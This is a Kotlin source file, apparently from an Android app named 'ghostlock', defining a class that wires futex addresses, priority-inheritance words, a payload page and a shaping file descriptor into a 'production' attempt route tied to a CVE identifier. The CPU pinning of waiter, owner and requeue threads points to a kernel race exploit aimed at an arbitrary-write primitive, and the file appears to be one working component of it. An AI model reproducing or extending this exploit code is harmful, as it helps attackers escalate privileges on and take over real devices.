package com.ghostlock.app.backend.cve43499.ktstep.run

import com.ghostlock.app.engine.ktstep.KernelFutexWords
import com.ghostlock.app.engine.ktstep.KernelRoute
import com.ghostlock.app.engine.ktstep.KtStepPlan
import com.ghostlock.app.engine.ktstep.NativeAttemptKernelRoute
import com.ghostlock.app.engine.ktstep.NativeAttemptParams
import com.ghostlock.app.engine.ktstep.NativeAttemptPort
import com.ghostlock.app.engine.ktstep.NativePrepareResult
import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.ProductionRoute
import com.ghostlock.app.engine.ktstep.RouteKind
import com.ghostlock.app.engine.ktstep.RouteResult
import com.ghostlock.app.engine.ktstep.WriteRequest

/**
 * Wires prepare facts + PI words into the production attempt route.
 * The caller owns [words]/prepare/port lifetimes; this route owns none of them.
 */
class Cve43499PreparedRoute(
    prepared: NativePrepareResult.Ok,
    words: KernelFutexWords,
    plan: KtStepPlan,
    port: NativeAttemptPort,
) : ProductionRoute {
    init { require(prepared.shapingFd >= 0) { "prepared shaping fd missing" } }
    override val kind: RouteKind = RouteKind.Production
    private val delegate = NativeAttemptKernelRoute(
        port,
        NativeAttemptParams(
            chainAddress = words.chain.address,
            waitAddress = words.wait.address,
            targetAddress = words.target.address,
            pageSinkAddress = 1L,
            chainValue = 0,
            waitValue = 0,
            targetValue = 0,
            page = ByteArray(0),
            pointerBytes = plan.layoutInputs.pointerBytes,
            parkTimeoutNs = -1L,
            joinTimeoutMs = 3_000,
            settleUs = 500,
            waiterCpu = 0,
            ownerCpu = 1,
            requeueCpu = 2,
            waiterNice = 0,
            ownerNice = 0,
            requeueNice = 0,
            policy = 0,
            pageFd = prepared.shapingFd,
        ),
    )

    override fun attempt(request: WriteRequest, page: ByteArray, inputs: PayloadPageInputs): RouteResult =
        delegate.attempt(request, page, inputs)
}
